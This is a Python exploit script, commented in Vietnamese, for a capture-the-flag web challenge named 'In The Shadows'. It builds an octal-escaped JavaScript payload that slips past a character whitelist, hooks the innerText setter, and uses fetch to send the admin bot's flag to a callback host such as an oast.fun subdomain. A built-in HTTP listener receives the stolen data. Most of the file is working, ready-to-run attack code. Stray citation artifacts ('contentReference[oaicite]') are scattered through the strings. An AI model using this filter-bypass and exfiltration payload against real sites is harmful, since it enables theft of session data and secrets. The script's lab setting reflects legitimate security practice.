#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Exploit script cho challenge "In The Shadows"

- Tạo payload JS bypass whitelist (dùng escape bát phân),
  hook setter `innerText` để lấy flag và exfil qua fetch.
- Gửi payload tới /admin để AdminBot ghé thăm /?code=...
- Tùy chọn: chạy HTTP server local để nhận exfil (dùng host.docker.internal).

Yêu cầu: Python 3 + requests (đã có trong requirements):contentReference[oaicite:5]{index=5}.
"""

import argparse
import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse, parse_qs
import requests
import sys
import time


def octal_escape(s: str) -> str:
    """Chuyển chuỗi thành chuỗi escape bát phân JS (không chứa chữ cái)."""
    return ''.join('\\%03o' % ord(c) for c in s)


def build_js_payload(exfil_url: str) -> str:
    from urllib.parse import urlparse
    def oct(s): return ''.join('\\%03o' % ord(c) for c in s)

    # Bắt buộc là URL tuyệt đối (bắt đầu bằng 'http://' hoặc 'https://' hoặc '//' scheme-relative)
    if not (exfil_url.startswith('http://') or exfil_url.startswith('https://') or exfil_url.startswith('//')):
        raise ValueError("Callback phải là URL tuyệt đối, ví dụ: //sub.oast.fun/?d= hoặc https://sub.oast.fun/?d=")

    # Bảo đảm có tham số ?d=
    if not (exfil_url.endswith('?d=') or exfil_url.endswith('&d=')):
        exfil_url += ('&' if '?' in exfil_url else '?') + 'd='

    H = [
        # x = document, d = window, y = HTMLElement
        "const x=canvas['\\157\\167\\156\\145\\162\\104\\157\\143\\165\\155\\145\\156\\164'];",
        "const d=x['\\144\\145\\146\\141\\165\\154\\164\\126\\151\\145\\167'];",
        "const y=d['\\110\\124\\115\\114\\105\\154\\145\\155\\145\\156\\164'];",
        # hue = callback URL (octal-escaped)
        "const hue='" + oct(exfil_url) + "';",
        # Object.defineProperty(HTMLElement.prototype,'innerText',{ set(v){ fetch(hue+encodeURIComponent(v)); } });
        "d['\\117\\142\\152\\145\\143\\164']['\\144\\145\\146\\151\\156\\145\\120\\162\\157\\160\\145\\162\\164\\171'](" +
            "y['\\160\\162\\157\\164\\157\\164\\171'], '\\151\\156\\156\\145\\162\\124\\145\\170\\164'," +
            "{'\\163\\145\\164':function(x){d['\\146\\145\\164\\143\\150'](hue+d['\\145\\156\\143\\157\\144\\145\\125\\122\\111\\103\\157\\155\\160\\157\\156\\145\\156\\164'](x));}});"
    ]
    js = ''.join(H)
    if len(js) > 1024:
        raise ValueError(f"Payload quá dài ({len(js)} bytes) – hãy dùng domain ngắn hơn (ví dụ //<sub>.oast.fun/?d=)")
    return js



class ExfilHandler(BaseHTTPRequestHandler):
    """HTTP handler nhận GET /?d=<data> và in ra màn hình."""
    def do_GET(self):
        try:
            q = parse_qs(urlparse(self.path).query)
            data = q.get("d", [""])[0]
            # In flag/secret ra console
            print(f"\n[EXFIL] d={data}\n")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"ok\n")
        except Exception as e:
            self.send_response(500)
            self.end_headers()

    def log_message(self, fmt, *args):
        # Giảm ồn logs
        pass


def start_local_exfil_server(port: int) -> threading.Thread:
    """Chạy HTTP server local ở 0.0.0.0:<port> để nhận exfil."""
    httpd = HTTPServer(("0.0.0.0", port), ExfilHandler)
    t = threading.Thread(target=httpd.serve_forever, daemon=True)
    t.start()
    print(f"[+] Exfil server đang lắng nghe tại http://0.0.0.0:{port}/ (tham số ?d=...)")
    return t


def send_to_admin(target_base: str, js_code: str):
    """Gửi payload tới /admin để bot truy cập /?code=...:contentReference[oaicite:8]{index=8}."""
    url = target_base.rstrip("/") + "/admin"
    resp = requests.post(url, json={"code": js_code}, timeout=15)
    print(f"[+] POST {url} -> {resp.status_code} {resp.reason}")
    try:
        print("[+] Server trả về:", resp.json())
    except Exception:
        print("[+] Server trả về:", resp.text[:200], "...")


def main():
    ap = argparse.ArgumentParser(description="Exploit In The Shadows – hook innerText và exfil flag")
    ap.add_argument("--target", default="http://localhost:5001",
                    help="Base URL của server (mặc định: %(default)s)")
    ap.add_argument("--callback", default=None,
                    help="URL nhận exfil (ví dụ: http://host.docker.internal:8000/?d= ). "
                         "Nếu không set, sẽ tự chạy server local và dùng host.docker.internal.")
    ap.add_argument("--port", type=int, default=8000, help="Cổng cho server local (mặc định: %(default)s)")
    args = ap.parse_args()

    # Nếu không cung cấp --callback, bật server local và dùng host.docker.internal (tiện cho Docker Desktop).
    if args.callback:
        exfil_url = args.callback
        print(f"[i] Dùng callback URL do bạn cung cấp: {exfil_url}")
        print("    * Nhắc: URL càng ngắn càng tốt để không vượt giới hạn 1024 bytes:contentReference[oaicite:9]{index=9}.")
    else:
        # Máy Mac/Windows (Docker Desktop) thường hỗ trợ host.docker.internal trỏ về host.
        exfil_url = f"http://host.docker.internal:{args.port}/?d="
        start_local_exfil_server(args.port)
        print("[i] Không có --callback: dùng server local + host.docker.internal")
        print(f"    => Callback URL: {exfil_url}")
        print("    * Nếu Linux không có host.docker.internal, hãy cung cấp --callback là http://<LAN-IP>:<port>/?d=")

    # Xây payload và gửi
    js = build_js_payload(exfil_url)
    print(f"[+] Payload JS đã tạo (độ dài {len(js)} bytes) – gửi cho AdminBot...")
    send_to_admin(args.target, js)

    # Giữ tiến trình nếu chạy server local để chờ exfil
    if not args.callback:
        print("[i] Đang chờ bot truy cập và exfil... (AdminBot chờ ~ vài giây):contentReference[oaicite:10]{index=10}")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            print("\n[!] Dừng.")


if __name__ == "__main__":
    main()
